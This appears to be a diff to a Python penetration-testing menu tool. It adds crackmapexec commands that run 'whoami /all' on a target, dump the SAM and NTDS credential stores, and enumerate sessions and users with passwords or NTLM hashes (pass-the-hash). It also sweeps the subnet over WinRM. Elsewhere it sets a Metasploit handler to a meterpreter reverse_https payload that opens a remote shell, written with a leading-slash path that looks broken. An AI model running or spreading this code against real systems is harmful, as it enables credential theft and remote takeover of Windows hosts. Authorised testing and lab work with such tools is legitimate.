@@ -1151,7 +1151,10 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '12':
-      checkParams = testFour("88")
+      checkParams = testOne()
+      
+      if checkParams != 1:
+         checkParams = testFour("88")
 
       if checkParams != 1:
          command("nmap " + IP46 + " -sV -p 88 " + TIP.rstrip(" ") + " | grep 'server time' | sed 's/^.*: //' > time.tmp")     
@@ -1864,6 +1867,8 @@ while True:
             command("sed -i /'is an IPv6 address'/d shares.tmp")
             command("sed -i /'no workgroup'/d shares.tmp")
             command("sed -i /'NT_STATUS_LOGON_FAILURE'/d shares.tmp")
+            command("sed -i /'NT_STATUS_ACCESS_DENIED'/d shares.tmp")
+            command("sed -i /'NT_STATUS_ACCOUNT_DISABLED'/d shares.tmp")
             command("sed -i /Sharename/d shares.tmp")
             command("sed -i /---------/d shares.tmp")
             command("sed -i '/^$/d' shares.tmp")
@@ -1998,7 +2003,10 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '46':
-      checkParams = testTwo()      
+      checkParams = testTwo()
+      
+      if checkParams != 1:
+         checkParams = testFour("88")
       
       if checkParams != 1:
          print("[*] Enumerating remote server, please wait...")
@@ -2037,7 +2045,9 @@ while True:
                   if USER[x][:1] != " ":
                      write1.write(USER[x].rstrip(" ") + "\n")
                      write2.write(HASH[x].rstrip(" ") + "\n")
-                     write3.write(VALD[x].rstrip(" ") + "\n")                     
+                     write3.write(VALD[x].rstrip(" ") + "\n")
+         else:
+            print("[-] No valid usernames was enumerated...")
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -2498,27 +2508,46 @@ while True:
             command("crackmapexec winrm " + TIP.rstrip(" ") + "/24")
             
          if "445" in PTS:
+            print("\n[+] Checking priviliges...\n")
+            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -X 'whoami /all'")                  
             print("\n[+] Enumerating users...\n")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " --users ")      
+            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " --users")      
             print("\n[+] Enumerating shares...\n")
             command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " --shares")
+            print("\n[+] Enumerating sessions...\n")
+            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " --sessions")            
+            print("\n[+] Enumerating SAM...\n")
+            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " --local-auth --sam")
+            print("\n[+] Enumerating NTDS...\n")
+            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " --local-auth --ntds drsuapi")
             checkParams = 1
 
       if checkParams != 1:
          print("[i] Using HASH value as password credential...")  
-         
+
          if "5985" in PTS:
             print("[+] Finding exploitable machines on the same subnet...\n")
             command("crackmapexec winrm " + TIP.rstrip(" ") + "/24")
          
          if "445" in PTS:
+            print("\n[+] Checking priviliges...\n")
+            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " -X 'whoami /all'")                     
             print("\n[+] Enumerating users...\n")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --users ")
+            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --users")
             print("\n[+] Enumerating shares...\n")
             command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --shares")
-      
-      prompt()
-   
+            print("\n[+] Enumerating sessions...\n")
+            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --sessions")                        
+            print("\n[+] Enumerating SAM...\n")
+            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --local-auth --sam")      
+            print("\n[+] Enumerating NTDS...\n")
+            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --local-auth --ntds drsuapi")                    
+
+         try:
+            null = input("\nPress ENTER to continue...")
+         except EOFError as e:
+            print(e)
+               
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
@@ -3269,7 +3298,7 @@ while True:
          
          with open("meterpreter.rc", "w") as write:
             write.write("use exploit/multi/handler\n")
-            write.write("set PAYLOAD windows/meterpreter/reverse_tcp\n")	# NEED OPTION TO CHOOSE A DIFFERNT PAYLOAD AT SOME STAGE
+            write.write("set PAYLOAD /windows/meterpreter/reverse_https\n")	# NEED OPTION TO CHOOSE A DIFFERNT PAYLOAD AT SOME STAGE
             write.write("set LHOST " + localIP + "\n")
             write.write("set LPORT " + checkParams + "\n")
             write.write("clear\n")
